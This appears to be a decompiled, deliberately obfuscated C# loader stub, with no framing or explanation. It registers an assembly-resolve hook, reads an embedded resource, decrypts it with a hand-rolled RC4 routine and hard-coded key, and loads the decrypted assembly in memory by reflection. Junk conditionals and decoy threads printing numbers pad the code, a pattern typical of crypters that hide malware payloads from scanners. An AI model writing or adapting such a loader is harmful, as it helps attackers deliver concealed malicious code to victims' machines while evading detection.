using System;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;

namespace Wqmrogjs;

internal sealed class d : b
{
	[Serializable]
	private sealed class a
	{
		public static readonly a a;

		public static ThreadStart b;

		public static ThreadStart c;

		static a()
		{
			a obj = new a();
			if (8u != 0)
			{
				Wqmrogjs.d.a.a = obj;
			}
		}

		public a()
		{
			_ = 5;
			if (5 == 0)
			{
			}
			base._002Ector();
		}

		internal void a()
		{
			int num;
			if (2u != 0)
			{
				num = 0;
			}
			while (num < 999)
			{
				int value = num;
				if (0 == 0)
				{
					Console.WriteLine(value);
				}
				int num2 = num + 1;
				if (4u != 0)
				{
					num = num2;
				}
			}
		}

		internal void b()
		{
			int num;
			if (6u != 0)
			{
				num = 0;
			}
			while (num < 999)
			{
				int value = num;
				if (4u != 0)
				{
					Console.WriteLine(value);
				}
				int num2 = num + 1;
				if (2u != 0)
				{
					num = num2;
				}
			}
		}
	}

	private int b;

	private int c;

	private int m_d;

	private int e;

	private int f;

	private string g;

	private int[] h;

	private int[] l;

	private byte[] m;

	public d()
	{
		if (7u != 0)
		{
			g = "Wqmrogjs.Onbjqormmjsglpfdfozbdkmz.dll";
		}
		base._002Ector();
	}

	public void rd4skt2nv3kweq5ln47ll4myrnzrf87rPEa()
	{
		AppDomain currentDomain = AppDomain.CurrentDomain;
		_ = 1;
		if (5 == 0)
		{
		}
		currentDomain.AssemblyResolve += a;
	}

	private byte[] a(byte[] a)
	{
		int[] array = new int[256];
		if (uint.MaxValue != 0)
		{
			h = array;
		}
		int[] array2 = new int[256];
		if (6u != 0)
		{
			l = array2;
		}
		byte[] array3 = new byte[a.Length];
		if (5u != 0)
		{
			m = array3;
		}
		byte[] bytes = Encoding.UTF8.GetBytes("Degcsjtsbf");
		byte[] array4;
		if (true)
		{
			array4 = bytes;
		}
		if (2u != 0)
		{
			c = 0;
		}
		while (c < 256)
		{
			h[c] = array4[c % array4.Length];
			l[c] = c;
			int num = c + 1;
			if (2u != 0)
			{
				c = num;
			}
		}
		int num2;
		if (2u != 0)
		{
			num2 = 0;
		}
		c = 0;
		for (m_d = num2; c < 256; c++)
		{
			m_d = (m_d + l[c] + h[c]) % 256;
			f = l[c];
			l[c] = l[m_d];
			l[m_d] = f;
		}
		new Thread(Wqmrogjs.d.a.a.a).Start();
		for (b = (m_d = (c = 0)); c < a.Length; c++)
		{
			b++;
			b %= 256;
			m_d += l[b];
			m_d %= 256;
			f = l[b];
			l[b] = l[m_d];
			l[m_d] = f;
			e = l[(l[b] + l[m_d]) % 256];
			m[c] = (byte)(a[c] ^ e);
		}
		return m;
	}

	private Assembly a(object a, ResolveEventArgs b)
	{
		Stream? manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(g);
		byte[] array = new byte[manifestResourceStream!.Length];
		byte[] array2;
		if (6u != 0)
		{
			array2 = array;
		}
		manifestResourceStream!.Read(array2, 0, array2.Length);
		ThreadStart threadStart = Wqmrogjs.d.a.c;
		if (threadStart == null)
		{
			threadStart = Wqmrogjs.d.a.a.b;
			ThreadStart obj = threadStart;
			if (2u != 0)
			{
				Wqmrogjs.d.a.c = obj;
			}
		}
		Thread thread = new Thread(threadStart);
		if (4u != 0)
		{
			thread.Start();
		}
		byte[] array3 = this.a(array2);
		return (Assembly)typeof(Assembly).InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { array3 });
	}
}
